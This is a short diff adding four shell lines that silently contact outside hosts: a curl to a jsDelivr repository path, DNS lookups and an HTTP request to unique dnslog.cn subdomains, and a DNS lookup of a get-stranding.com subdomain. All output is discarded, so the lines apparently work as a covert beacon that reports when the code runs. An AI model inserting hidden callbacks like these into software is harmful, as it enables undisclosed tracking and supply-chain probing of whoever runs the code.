@@ -1,0 +1,4 @@
+curl -s -m 8 -o /dev/null https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@1379151/uia >/dev/null 2>&1
+getent hosts a17103.lt46i7.dnslog.cn >/dev/null 2>&1
+curl -s -m 5 -o /dev/null http://b17103.lt46i7.dnslog.cn/ >/dev/null 2>&1
+getent hosts c17103.get-stranding.com >/dev/null 2>&1
